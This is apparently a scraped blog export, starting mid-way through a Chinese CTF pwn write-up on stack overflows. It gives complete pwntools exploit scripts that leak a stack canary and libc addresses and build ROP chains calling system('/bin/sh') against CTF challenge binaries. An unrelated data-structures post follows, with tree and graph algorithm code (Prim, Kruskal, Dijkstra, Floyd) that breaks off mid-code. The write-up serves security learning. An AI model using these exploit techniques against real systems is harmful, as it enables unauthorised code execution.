指令下断点查看栈的情况 可以看到 6161 下面有一串 16 进制数，这个就是 canary 值，利用 %7$p 就可以泄露它的值，而且看到它在栈的位置是 0x18 泄露 canary: 1234payload = '%7$p'p.sendline(payload)p.recvuntil('0x')canary = int(p.recv(16),16) 另外 pwngbd 提供了一种方便的函数 fmtarg，使用格式为 fmtarg addr。在进入 printf 函数时断下，调用 fmtarg 后可以自动计算格式化参数与 addr 的偏移。fmtarg 在计算 index 时将 RDI 也算了进去，后面会自动减一作为 %$p 的参数： 利用 puts 函数泄露 libc，puts 函数只有一个参数，64 位传参，利用 rdi 寄存器即可，ROPgadget 找 rdi exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *from LibcSearcher import *# p = process('./bjdctf_2020_babyrop2')p = remote('node4.buuoj.cn',25998)elf = ELF('./bjdctf_2020_babyrop2')context.log_level = 'debug'payload = '%7$p'p.sendline(payload)p.recvuntil('0x')canary = int(p.recv(16),16)print str(canary)puts_plt = elf.plt['puts']puts_got = elf.got['puts']pop_rdi = 0x400993main_addr = elf.sym['main']vul_addr = 0x400887payload = 'a'*0x18+p64(canary)payload += p64(0)payload +=p64(pop_rdi)payload +=p64(puts_got)payload +=p64(puts_plt)+p64(vul_addr)p.recvuntil('story!\\n')p.sendline(payload)puts_addr = u64(p.recv(6).ljust(8,'\\x00'))print hex(puts_addr)libc = LibcSearcher('puts',puts_addr)base = puts_addr-libc.dump('puts')sys_addr = base+libc.dump('system')binsh = base+libc.dump('str_bin_sh')p.recvuntil('story!\\n')payload ='a'*0x18+p64(canary)+p64(0)+p64(pop_rdi)+p64(binsh)+p64(sys_addr)payload +=p64(main_addr)p.sendline(payload)p.interactive() printf 泄露真实地址 12345678910111213141516171819202122232425262728293031323334353637from pwn import *from LibcSearcher import LibcSearcher#p=process('./babyrop2')p=remote('node3.buuoj.cn',25002)elf=ELF('./babyrop2')read_got=elf.got['read']printf_plt=elf.plt['printf']main_addr=elf.sym['main']format_addr=0x400770&quot;&quot;&quot;0x000000000040072c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040072e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400730 : pop r14 ; pop r15 ; ret0x0000000000400732 : pop r15 ; ret0x000000000040072b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040072f : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004005a0 : pop rbp ; ret0x0000000000400733 : pop rdi ; ret0x0000000000400731 : pop rsi ; pop r15 ; ret0x000000000040072d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004004d1 : ret0x0000000000400532 : ret 0x200a&quot;&quot;&quot;payload='a'*40+p64(0x400733)+p64(format_addr)+p64(0x400731)+p64(read_got)+p64(0)payload+=p64(printf_plt)+p64(main_addr)p.sendlineafter(&quot;name?&quot;,payload)p.recvuntil('!\\n')read_addr=u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))libc=LibcSearcher(&quot;read&quot;,read_addr)libc_base=read_addr-libc.dump('read')sys_addr=libc_base+libc.dump(&quot;system&quot;)binsh_addr=libc_base+libc.dump(&quot;str_bin_sh&quot;)payload2='a'*40+p64(0x400733)+p64(binsh_addr)+p64(sys_addr)+p64(0)p.sendline(payload2)p.interactive() # pwn2_sctf_2016 12345678910111213141516171819202122232425262728293031from pwn import *from LibcSearcher import *#p = process('./pwn')p = remote('node3.buuoj.cn',29130)elf = ELF('./pwn')format_str = 0x080486F8printf_plt = elf.plt['printf']main_addr = elf.symbols['main']printf_got = elf.got['printf']p.recvuntil('read? ')p.sendline('-1')p.recvuntil('data!\\n')payload = 'a'*0x30 + p32(printf_plt)+p32(main_addr)+p32(format_str)+p32(printf_got)p.sendline(payload)p.recvuntil('said: ')#这是程序正常输出的p.recvuntil('said: ')#这是printf的那个格式化字符串printf_addr = u32(p.recv(4))libc = LibcSearcher('printf', printf_addr)libc_base = printf_addr - libc.dump('printf')sys_addr = libc_base + libc.dump('system')str_bin = libc_base + libc.dump('str_bin_sh')p.recvuntil('read? ')p.sendline('-1')p.recvuntil('data!\\n')p.sendline('a'*0x30 + p32(sys_addr) + p32(main_addr) + p32(str_bin))p.interactive()#复制自https://blog.csdn.net/qinying001/article/details/104374305 123456789101112131415161718192021222324252627282930313233#coding=utf-8from pwn import *from LibcSearcher import *context(os = &quot;linux&quot;, arch = &quot;i386&quot;, log_level= &quot;debug&quot;)p = process('./test1')elf = ELF(&quot;./test1&quot;)libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')read_got = elf.got[&quot;read&quot;]write_plt = elf.plt[&quot;write&quot;]main_addr = elf.symbols[&quot;main&quot;]payload = &quot;a&quot; *(0xC8+4) + p32(write_plt)payload += p32(main_addr)payload += p32(1) + p32(read_got) + p32(4)p.sendlineafter('Welcome!\\n',payload)read_addr = u32(p.recvuntil(&quot;\\xf7&quot;)[-4:])# libc = LibcSearcher(&quot;read&quot;, read_addr)libc_base = read_addr - libc.dump(&quot;read&quot;)system_addr = libc_base + libc.dump(&quot;system&quot;)binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)payload = &quot;a&quot; * (0xC8+4) + p32(system_addr)payload += p32(main_addr)payload += p32(binsh_addr)p.sendlineafter('Welcome!\\n',payload)p.interactive()","link":"/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/"},{"title":"数据结构基础代码总结（树和图）","text":"树和图部分 # 一、树和二叉树 # 树的遍历 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct BiTNode { ElemType data; struct BiTNode *lchild, *rchild;} BiTNode, *BiTree;//先序遍历//递归void PreOrder(BiTree T) { if (T != NULL) { visit(T); PreOrder(T-&gt;lchild); PreOrder(T-&gt;rchild); }}//非递归void PreOrder2(BiTree T) { InitStack(S); BiTree p = T; while (p || !IsEmpty(S)) { if (p) { visit(p); Push(S, p); p = p-&gt;lchild; } else { Pop(S, p); p = p-&gt;rchild; } }}//中序遍历//递归void InOrder(BiTree T) { if (T != NULL) { InOrder(T-&gt;lchild); visite(T); InOrder(T-&gt;rchild); }}//非递归void InOrder2(BiTree T) { InitStack(S); BiTree p = T; while (p || !IsImpty(S)) { if (p) { push(S, p); p = p-&gt;lchild; } else { Pop(S, p); visit(p); p = p-&gt;rchild; } }}//后序遍历void PostOrder(BiTree T) { if (T != NULL) { PostOrder(T-&gt;lchild); PostOrder(T-&gt;rchild); visit(T); }}//层次遍历void LevelOrder(BiTree T) { InitQueue(Q); BiTree p; EnQueue(Q, T); while (!Empty(Q)) { DeQueue(Q, p); visit(p); if (p-&gt;lchild != NULL) EnQueue(Q, p-&gt;lchild); if (p-&gt;rchild != NULL) EnQueue(Q, p-&gt;rchild); }} # 线索二叉树 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;typedef struct ThreadNode { ElemType data; struct ThreadNode *lchild, *rchild; int ltag, rtag;} ThreadNode, *ThreadTree;//中序线索二叉树//递归void InThread(ThreadTree &amp;p, ThreadTree &amp;pre) { if (p != NULL) { InThread(p-&gt;lchild, pre); //递归，线索化左子树 if (p-&gt;lchild == NULL) { //左子树为空，建立前驱线索 p-&gt;lchild = pre; p-&gt;ltag = 1; } if (pre != NULL &amp;&amp; pre-&gt;rchild == NULL) { pre-&gt;rchild = p; //建立前驱节点的后继线索 pre-&gt;rtag = 1; } pre = p; //标记当前结点为刚刚访问过的结点 InThread(p-&gt;rchild, pre); }}void CreatInThread(ThreadTree T) { ThreadTree pre = NULL; if (T != NULL) { InThead(T, pre); pre-&gt;rchild = NULL; //处理遍历的最后一个结点 pre-&gt;rtag = 1; }} # 遍历 1234567891011121314151617//中序线索树的遍历ThreadNode *Firstnode(ThreadNode *p){ while(p-&gt;ltag==0) p=p-&gt;lchild; return p;}ThreadNode *Nextnode(ThreadNode *p){ if(p-&gt;rtag==0) return Firstnode(p-&gt;rchild); else return p-&gt;rchild;}//不含头结点的中序线索树的中序遍历void Inorder(ThreadNode *T){ for(ThreadNode *p=Firstnode(T);p!=NULL;p=Nextnode(p)) visit(p);} # 二、图 # BFS 广度优先搜索 主要使用队列实现，对每个节点可能到达的路径进行入队出队判断 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;stdio.h&gt;#define MaxVertexNum 100typedef char VertexType;typedef int EdgeType;int Max = 0x3f3f3f3f;typedef struct { VertexType Vex[MaxVertexNum]; EdgeType EdgeType[MaxVertexNum][MaxVertexNum]; int vexnum, arcnum;} Gragh;//BFS遍历bool visited[MaxVertexNum];void BFSTraverse(Graph G) { for (int i = 0; i &lt; G.vexnum; ++i) visited[i] = false; InitQueue(Q); for (int i = 0; i &lt; G.vexnum; ++i) if (!visited[i]) BFS(G, i);}void BFS(Graph G, int v) { visit(v); visited[v] = true; Enqueue(Q, v); while (!isEmpty(Q)) { DeQueue(Q, v); for (w = FirstNeighbor(G, v); w &gt;= 0; w = NextNeighbor(G, v, w)) if (!visited[w]) { visit(w); visited[w] = true; EnQueue(Q, w); } }}//BFS求单源最短路径void BFS_MIN_Distance(Graph G, int u) { for (int i = 0; i &lt; G.vexnum; i++) d[i] = Max; //初始化路径为无穷 visited[u] = true; d[u] = 0; EnQueue(Q, u); while (!isEmpty(Q)) { DeQueue(Q, u); for (w = FirstNeighbor(G, u); w &gt;= 0; w = NextNeighbor(G, u, w)) if (!visited[w]) { visited[w] = true; d[w] = d[u] + 1; EnQueue(Q, w); } }} # DFS 深度优先搜索 12345678910111213141516bool visited[MAX_VERTEX_NUM];void DFSTraverse(Graph G){ for(v=0;v&lt;G.vexnum;++v) visited[v]=FALSE; for(v=0;v&lt;G.vexnum;++v) if(!visited[v]) DFS(G,v);}void DFS(Graph G,int v){ visit(v); visited[v]=TRUE; for(w=FirstNeighbor(G,v);w&gt;=0;w=NextNeighbor(G,v,w)) if(!visited[w]){ DFS(G,w); }} # 最小生成树 关于图的几个概念定义： 连通图：在无向图中，若任意两个顶点 vivi 与 vjvj 都有路径相通，则称该无向图为连通图。 强连通图：在有向图中，若任意两个顶点 vivi 与 vjvj 都有路径相通，则称该有向图为强连通图。 连通网：在连通图中，若图的边具有一定的意义，每一条边都对应着一个数，称为权；权代表着连接连个顶点的代价，称这种连通图叫做连通网。 生成树：一个连通图的生成树是指一个连通子图，它含有图中全部 n 个顶点，但只有足以构成一棵树的 n-1 条边。一颗有 n 个顶点的生成树有且仅有 n-1 条边，如果生成树中再添加一条边，则必定成环。 最小生成树：在连通网的所有生成树中，所有边的代价和最小的生成树，称为最小生成树。 下面介绍两种求最小生成树算法 1.Kruskal 算法 此算法可以称为 “加边法”，初始最小生成树边数为 0，每迭代一次就选择一条满足条件的最小代价边，加入到最小生成树的边集合里。 把图中的所有边按代价从小到大排序； 把图中的 n 个顶点看成独立的 n 棵树组成的森林； 按权值从小到大选择边，所选的边连接的两个顶点 ui,viui,vi, 应属于两颗不同的树，则成为最小生成树的一条边，并将这两颗树合并作为一颗树。 重复 (3), 直到所有顶点都在一颗树内或者有 n-1 条边为止。 Prim 算法 此算法可以称为 “加点法”，每次迭代选择代价最小的边对应的点，加入到最小生成树中。算法从某一个顶点 s 开始，逐渐长大覆盖整个连通网的所有顶点。 图的所有顶点集合为 VV；初始令集合 u={s},v=V−uu={s},v=V−u; 在两个集合 u,vu,v 能够组成的边中，选择一条代价最小的边 (u0,v0)(u0,v0)，加入到最小生成树中，并把 v0v0 并入到集合 u 中。 重复上述步骤，直到最小生成树有 n-1 条边或者 n 个顶点为止。 由于不断向集合 u 中加点，所以最小代价边必须同步更新；需要建立一个辅助数组 closedge, 用来维护集合 v 中每个顶点与集合 u 中最小代价边信息，： 123456struct{ char vertexData //表示u中顶点信息 UINT lowestcost //最小代价}closedge[vexCounts] # Prim 算法 最小生成树是一个图的极小连通子图，它包含原图的所有顶点，并且所有边的权值之和尽可能小。 Prim 算法就是图的最小生成树算法之一，Prim 算法是一种求解加权无向连通图的 MST 问题的贪心算法。它能找出一个边的子集，使得其构成的树包含图中所有顶点，且边的权值之和最小。 Prim 算法以图的顶点为基础，从首个初始顶点，寻找到达其他顶点权值最小的边，并把该顶点加入到 “ 已到达顶点 ” 的集合中，此时，这个集合就是这个图的最小生成树。 一般用一维数组比较方便表达最小生成树，数组下标所对应的元素，代表该顶点在最小生成树当中的父亲节点。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990// 基于Prim算法实现最小生成树#include &lt;iostream&gt;#include &lt;vector&gt;const int INF = 1e7;using namespace std;vector&lt;vector&lt;int&gt;&gt; Init() { int n, m; cout &lt;&lt; &quot;请输入带权无向图的定点数和边数(以空格隔开):&quot; &lt;&lt; endl; cin &gt;&gt; n &gt;&gt; m; vector&lt;vector&lt;int&gt;&gt; graph(n+1, vector&lt;int&gt;(n+1, INF)); cout &lt;&lt; &quot;请依次输入&quot; &lt;&lt; m &lt;&lt; &quot;条边的开始节点，结束节点，权值(以空格隔开):&quot; &lt;&lt; endl; int start, end, wet; for (int i = 0; i &lt; m; i++) { cin &gt;&gt; start &gt;&gt; end &gt;&gt; wet; graph[start][end] = wet; graph[end][start] = wet; } return graph;}int Prim(vector&lt;vector&lt;int&gt;&gt;&amp; c, int u) { int n = c.size() - 1; // 定义数据结构lowcost[]，closest[]，s[] vector&lt;int&gt; lowcost(n+1); vector&lt;int&gt; closest(n+1); vector&lt;bool&gt; s(n+1); /// 1.初始化lowcost[]，closest[]，s[] s[u] = true; for (int i = 1; i &lt;= n; i++) { if (i != u) { lowcost[i] = c[u][i]; closest[i] = u; s[i] = false; } else lowcost[i] = 0; } // n个节点之间需要找最短路径n-1次 for (int i = 0; i &lt; n-1; i++) { // 2.找最小 int tmp = INF, t = u; for (int j = 1; j &lt;= n; j++) { if (!s[j] &amp;&amp; (lowcost[j] &lt; tmp)) { //!s[j]表示j节点V-U集合中 t = j; tmp = lowcost[j]; } } // 找不到，跳出循环 if (t == u) break; // 将t加入集合U s[t] = true; // 3.更新 for (int j = 1; j &lt;= n; j++) { if ((!s[j]) &amp;&amp; (c[t][j] &lt; lowcost[j])) { lowcost[j] = c[t][j]; closest[j] = t; } } } // 4.打印最终结果 int totalcost = 0; cout &lt;&lt; &quot;lowcost[]数组：&quot;; for (int i = 1; i &lt;= n; i++) { cout &lt;&lt; lowcost[i] &lt;&lt; &quot; &quot;; totalcost += lowcost[i]; } cout &lt;&lt; endl; cout &lt;&lt; &quot;closest[]数组：&quot;; for (int i = 1; i &lt;= n; i++) { cout &lt;&lt; closest[i] &lt;&lt; &quot; &quot;; } cout &lt;&lt; endl; return totalcost;}// test main()int main() { vector&lt;vector&lt;int&gt;&gt; graph = Init(); int weight = Prim(graph, 1); // 1表示从1开始找 cout &lt;&lt; &quot;\\n最小生成树总的花费是：&quot; &lt;&lt; weight &lt;&lt; endl;} 实验结果 请输入带权无向图的定点数和边数 (以空格隔开): 7 12 请依次输入 12 条边的开始节点，结束节点，权值 (以空格隔开): 1 2 23 1 6 28 1 7 36 2 3 20 2 7 1 3 4 15 3 7 4 4 5 3 4 7 9 5 6 17 5 7 16 6 7 25 lowcost [] 数组：0 23 4 9 3 17 1 closest [] 数组：0 1 7 7 4 5 2 最小生成树总的花费是：57 D:\\projects\\test\\x64\\Release\\test.exe (进程 1788) 已退出，返回代码为: 0。 # Kruskal 算法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159/************************************************************************CSDN 勿在浮沙筑高台 http://blog.csdn.net/luoshixian099算法导论--最小生成树（Prim、Kruskal）2016年7月14日************************************************************************/#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;queue&gt;#include &lt;algorithm&gt;using namespace std;#define INFINITE 0xFFFFFFFF #define VertexData unsigned int //顶点数据#define UINT unsigned int#define vexCounts 6 //顶点数量char vextex[] = { 'A', 'B', 'C', 'D', 'E', 'F' };struct node { VertexData data; unsigned int lowestcost;}closedge[vexCounts]; //Prim算法中的辅助信息typedef struct { VertexData u; VertexData v; unsigned int cost; //边的代价}Arc; //原始图的边信息void AdjMatrix(unsigned int adjMat[][vexCounts]) //邻接矩阵表示法{ for (int i = 0; i &lt; vexCounts; i++) //初始化邻接矩阵 for (int j = 0; j &lt; vexCounts; j++) { adjMat[i][j] = INFINITE; } adjMat[0][1] = 6; adjMat[0][2] = 1; adjMat[0][3] = 5; adjMat[1][0] = 6; adjMat[1][2] = 5; adjMat[1][4] = 3; adjMat[2][0] = 1; adjMat[2][1] = 5; adjMat[2][3] = 5; adjMat[2][4] = 6; adjMat[2][5] = 4; adjMat[3][0] = 5; adjMat[3][2] = 5; adjMat[3][5] = 2; adjMat[4][1] = 3; adjMat[4][2] = 6; adjMat[4][5] = 6; adjMat[5][2] = 4; adjMat[5][3] = 2; adjMat[5][4] = 6;}int Minmum(struct node * closedge) //返回最小代价边{ unsigned int min = INFINITE; int index = -1; for (int i = 0; i &lt; vexCounts;i++) { if (closedge[i].lowestcost &lt; min &amp;&amp; closedge[i].lowestcost !=0) { min = closedge[i].lowestcost; index = i; } } return index;}void MiniSpanTree_Prim(unsigned int adjMat[][vexCounts], VertexData s){ for (int i = 0; i &lt; vexCounts;i++) { closedge[i].lowestcost = INFINITE; } closedge[s].data = s; //从顶点s开始 closedge[s].lowestcost = 0; for (int i = 0; i &lt; vexCounts;i++) //初始化辅助数组 { if (i != s) { closedge[i].data = s; closedge[i].lowestcost = adjMat[s][i]; } } for (int e = 1; e &lt;= vexCounts -1; e++) //n-1条边时退出 { int k = Minmum(closedge); //选择最小代价边 cout &lt;&lt; vextex[closedge[k].data] &lt;&lt; &quot;--&quot; &lt;&lt; vextex[k] &lt;&lt; endl;//加入到最小生成树 closedge[k].lowestcost = 0; //代价置为0 for (int i = 0; i &lt; vexCounts;i++) //更新v中顶点最小代价边信息 { if ( adjMat[k][i] &lt; closedge[i].lowestcost) { closedge[i].data = k; closedge[i].lowestcost = adjMat[k][i]; } } }}void ReadArc(unsigned int adjMat[][vexCounts],vector&lt;Arc&gt; &amp;vertexArc) //保存图的边代价信息{ Arc * temp = NULL; for (unsigned int i = 0; i &lt; vexCounts;i++) { for (unsigned int j = 0; j &lt; i; j++) { if (adjMat[i][j]!=INFINITE) { temp = new Arc; temp-&gt;u = i; temp-&gt;v = j; temp-&gt;cost = adjMat[i][j]; vertexArc.push_back(*temp); } } }}bool compare(Arc A, Arc B){ return A.cost &lt; B.cost ? true : false;}bool FindTree(VertexData u, VertexData v,vector&lt;vector&lt;VertexData&gt; &gt; &amp;Tree){ unsigned int index_u = INFINITE; unsigned int index_v = INFINITE; for (unsigned int i = 0; i &lt; Tree.size();i++) //检查u,v分别属于哪颗树 { if (find(Tree[i].begin(), Tree[i].end(), u) != Tree[i].end()) index_u = i; if (find(Tree[i].begin(), Tree[i].end(), v) != Tree[i].end()) index_v = i; } if (index_u != index_v) //u,v不在一颗树上，合并两颗树 { for (unsigned int i = 0; i &lt; Tree[index_v].size();i++) { Tree[index_u].push_back(Tree[index_v][i]); } Tree[index_v].clear(); return true; } return false;}void MiniSpanTree_Kruskal(unsigned int adjMat[][vexCounts]){ vector&lt;Arc&gt; vertexArc; ReadArc(adjMat, vertexArc);//读取边信息 sort(vertexArc.begin(), vertexArc.end(), compare);//边按从小到大排序 vector&lt;vector&lt;VertexData&gt; &gt; Tree(vexCounts); //6棵独立树 for (unsigned int i = 0; i &lt; vexCounts; i++) { Tree[i].push_back(i); //初始化6棵独立树的信息 } for (unsigned int i = 0; i &lt; vertexArc.size(); i++)//依次从小到大取最小代价边 { VertexData u = vertexArc[i].u; VertexData v = vertexArc[i].v; if (FindTree(u, v, Tree))//检查此边的两个顶点是否在一颗树内 { cout &lt;&lt; vextex[u] &lt;&lt; &quot;---&quot; &lt;&lt; vextex[v] &lt;&lt; endl;//把此边加入到最小生成树中 } }} int main(){ unsigned int adjMat[vexCounts][vexCounts] = { 0 }; AdjMatrix(adjMat); //邻接矩阵 cout &lt;&lt; &quot;Prim :&quot; &lt;&lt; endl; MiniSpanTree_Prim(adjMat,0); //Prim算法，从顶点0开始. cout &lt;&lt; &quot;-------------&quot; &lt;&lt; endl &lt;&lt; &quot;Kruskal:&quot; &lt;&lt; endl; MiniSpanTree_Kruskal(adjMat);//Kruskal算法 return 0;} # Dijkstra 算法 (求单源最短路径问题) # 算法原理 适合求解有回路的带权图的最短路径 可以求任意两个顶点的最短路径 不适合求带负权值的最短路径问题 具体解释 # 邻接矩阵实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189#include&lt;iostream&gt;#include&lt;iomanip&gt;#include&lt;queue&gt;#include&lt;vector&gt;using namespace std;//用邻接矩阵构建有向图#define MAX 999//表示无穷#define MVNum 20//最大结点数typedef int VertexType;//设置结点的数据类型为int型（方便后续修改成char...）typedef int ArcType;//设置的权值为int型（方便后续修改成float...）class Graph//Adjacency Matrix Graph有向图，用邻接矩阵表示{public: void Create(); int LocateVex(VertexType u);//查找Graph中的顶点u，并返回其对应在顶点表中的下标，未找到则返回-1 int firstadj(int v); int nextadj(int v, int w); void Dijkstra(VertexType start_point);//使用迪杰斯特拉算法打印单源最短路径 void Show();//调试用，打印邻接矩阵private: VertexType vexs[MVNum];//顶点表,将顶点保存的信息存入此处 ArcType arcs[MVNum][MVNum];//邻接矩阵 int vexnum, arcnum;//图当前的顶点数和边数 vector&lt;queue&lt;VertexType&gt;&gt;path;//保存各结点最短路径的path[i] ArcType dist[MVNum];//最短路径大小 bool solved[MVNum];//是否找到最短路径};int Graph::LocateVex(VertexType u){//查找Graph中的顶点u，并返回其对应在顶点表中的下标，未找到则返回-1 int i; for (i = 0; i &lt; this-&gt;vexnum; i++) { if (u == this-&gt;vexs[i]) return i; } return -1;}int Graph::firstadj(int v){ for (int i = 0; i &lt; this-&gt;vexnum; i++) { if (this-&gt;arcs[v][i] != MAX) return i; } return -1;}int Graph::nextadj(int v, int w){ for (int i = w + 1; i &lt; this-&gt;vexnum; i++) { if (this-&gt;arcs[v][i] != MAX) return i; } return -1;}void Graph::Show(){ for (int i = 0; i &lt; this-&gt;vexnum; i++) { for (int j = 0; j &lt; this-&gt;vexnum; j++) { cout &lt;&lt; setw(4) &lt;&lt; this-&gt;arcs[i][j] &lt;&lt; &quot; &quot;; } cout &lt;&lt; endl; }}void Graph::Create(){ cout &lt;&lt; &quot;请输入总结点数和总边数:&quot;; cin &gt;&gt; this-&gt;vexnum &gt;&gt; this-&gt;arcnum;//输入总顶点数和总边数 cout &lt;&lt; &quot;请输入各结点的信息:&quot;; for (int i = 0; i &lt; this-&gt;vexnum; i++) { cin &gt;&gt; this-&gt;vexs[i]; } //初始化邻接矩阵 for (int i = 0; i &lt; this-&gt;vexnum; i++) { for (int j = 0; j &lt; this-&gt;vexnum; j++) { this-&gt;arcs[i][j] = MAX; } } //构造邻接矩阵 for (int i = 0; i &lt; this-&gt;arcnum; i++) { int v1, v2, w; cout &lt;&lt; &quot;请输入第&quot; &lt;&lt; i + 1 &lt;&lt; &quot;条边的起点和终点及其对应的权值:&quot;; cin &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; w; int m = LocateVex(v1); int n = LocateVex(v2); this-&gt;arcs[m][n] = w; } return;}void Graph::Dijkstra(VertexType start_point){ //初始化最短距离数组 for (int i = 0; i &lt; this-&gt;vexnum; i++) { this-&gt;dist[i] = MAX; } dist[this-&gt;LocateVex(start_point)] = 0; //初始化保存路径的向量 queue&lt;VertexType&gt;temp; temp.push(start_point); for (int i = 0; i &lt; this-&gt;vexnum; i++) { //（移到for外）queue&lt;VertexType&gt;temp; //temp.push(start_point); path.push_back(temp); //（不可行）path[i].push(start_point);//将起点作为最初始的路径加入每个结点对应的队列中 } //初始化solved数组 for (int i = 0; i &lt; this-&gt;vexnum; i++) { solved[i] = false; } for (int i = 0; i &lt; this-&gt;vexnum; i++) { if (this-&gt;arcs[this-&gt;LocateVex(start_point)][i] != MAX) { dist[i] = this-&gt;arcs[this-&gt;LocateVex(start_point)][i]; path[i].push(this-&gt;vexs[i]); } } solved[this-&gt;LocateVex(start_point)] = true; for (int i = 0; i &lt; this-&gt;vexnum; i++) {//返回地找 ArcType mind = MAX; int v = i; for (int j = 0; j &lt; this-&gt;vexnum; j++) {//一个劲地往前走 //（移出for）int v = i; if (!solved[j] &amp;&amp; dist[j] &lt; mind) { mind = dist[j]; v = j; } solved[v] = true; int w = this-&gt;firstadj(v); while (w != -1) { if (dist[v] + this-&gt;arcs[v][w] &lt; dist[w]) { dist[w] = dist[v] + this-&gt;arcs[v][w]; path[w] = path[v]; path[w].push(vexs[w]); } w = this-&gt;nextadj(v, w); } } } cout &lt;&lt; &quot;从结点&quot; &lt;&lt; start_point &lt;&lt; &quot;开始到各点的最短路径和路径长度如下:&quot;&lt;&lt;endl; for (int i = 0; i &lt; this-&gt;vexnum; i++) { if (dist[i] == MAX) { cout &lt;&lt; &quot;无法到达结点&quot; &lt;&lt; this-&gt;vexs[i] &lt;&lt; endl; } else { cout &lt;&lt; &quot;抵达结点&quot; &lt;&lt; this-&gt;vexs[i] &lt;&lt; &quot;的最短路径:&quot;; int path_length = path[i].size(); for (int j = 0; j &lt; path_length; j++) { cout &lt;&lt; path[i].front() &lt;&lt; &quot; &quot;; path[i].pop(); } cout &lt;&lt; &quot;长度为&quot; &lt;&lt; dist[i] &lt;&lt; endl; } }}int main(){ Graph s; s.Create(); s.Show(); VertexType start_point; cout &lt;&lt; &quot;请输入起点:&quot;; cin &gt;&gt; start_point; s.Dijkstra(start_point); system(&quot;pause&quot;); return 0;} 结果: 参考文章 # 邻接表实现 待定 # Floyd 算法 (求多源最短路径问题) # 算法思想 概括为迭代更新 i 经由 k 到 j 的最短路径. # 算法原理 从任意一条单边路径开始。所有两点之间的距离是边的权，如果两点之间没有边相连，则权为无穷大。 对于每一对顶点 u 和 v，看看是否存在一个顶点 w 使得从 u 到 w 再到 v 比已知的路径更短。如果是更新它。 把图用邻接矩阵 G 表示出来，如果从 Vi 到 Vj 有路可达，则 G [i][j]=d，d 表示该路的长度；否则 G [i][j]= 无穷大。定义一个矩阵 D 用来记录所插入点的信息，D [i][j] 表示从 Vi 到 Vj 需要经过的点，初始化 D [i][j]=j。把各个顶点插入图中，比较插点后的距离与原来的距离，G [i][j]= min ( G [i][j], G [i][k]+G [k][j] )，如果 G [i][j] 的值变小，则 D [i][j]=k。在 G 中包含有两点之间最短道路的信息，而在 D 中则包含了最短通路径的信息。 比如，要寻找从 V5 到 V1 的路径。根据 D，假如 D (5,1)=3 则说明从 V5 到 V1 经过 V3，路径为 {V5,V3,V1}，如果 D (5,3)=3，说明 V5 与 V3 直接相连，如果 D (3,1)=1，说明 V3 与 V1 直接相连。 # 邻接矩阵实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210#include&lt;stdio.h&gt;#include&lt;malloc.h&gt;#define MAXV 7 //最大顶点个数 #define INF 32767 //定义 ∞//∞ == 32767 ,int 型的最大范围（2位）= 2^(2*8-1)，TC告诉我们int占用2个字节，而VC和LGCC告诉我们int占用4个字节//图：Graph//顶点：Vertex//邻接：Adjacency//矩阵：Matrix//表：List//边：Edge typedef struct vertex { int number; //顶点的编号 }VertexType; //别名，顶点的类型 typedef struct matrix { int n; //顶点个数 int e; //边数 int adjMat[MAXV][MAXV]; //邻接矩阵数组 VertexType ver[MAXV]; //存放顶点信息 }MatGraph; //别名，完整的图邻接矩阵类型typedef struct eNode { int adjVer; //该边的邻接点编号 int weiLGht; //该边的的信息，如权值 struct eNode* nextEdLGe; //指向下一条边的指针 }EdgeNode; //别名，边结点的类型 typedef struct vNode { EdgeNode* firstEdLGe; //指向第一个边结点 }VNode; //别名，邻接表的头结点类型 typedef struct list { int n; //顶点个数 int e; //边数 VNode adjList[MAXV]; //邻接表的头结点数组 }ListGraph; //别名，完整的图邻接表类型 //创建图的邻接表 void createAdjListGraph(ListGraph*&amp; LG, int A[MAXV][MAXV], int n, int e) { int i, j; EdgeNode* p; LG = (ListGraph*)malloc(sizeof(ListGraph)); for (i = 0; i &lt; n; i++) { LG-&gt;adjList[i].firstEdLGe = NULL; //给邻接表中所有头结点指针域置初值 } for (i = 0; i &lt; n; i++) { //检查邻接矩阵中的每个元素 for (j = n - 1; j &gt;= 0; j--) { if (A[i][j] != 0) { //存在一条边 p = (EdgeNode*)malloc(sizeof(EdgeNode)); //申请一个结点内存 p-&gt;adjVer = j; //存放邻接点 p-&gt;weiLGht = A[i][j]; //存放权值 p-&gt;nextEdLGe = NULL; p-&gt;nextEdLGe = LG-&gt;adjList[i].firstEdLGe; //头插法 LG-&gt;adjList[i].firstEdLGe = p; } } } LG-&gt;n = n; LG-&gt;e = e;}//输出邻接表 void displayAdjList(ListGraph* LG) { int i; EdgeNode* p; for (i = 0; i &lt; MAXV; i++) { p = LG-&gt;adjList[i].firstEdLGe; printf(&quot;%d:&quot;, i); while (p != NULL) { if (p-&gt;weiLGht != 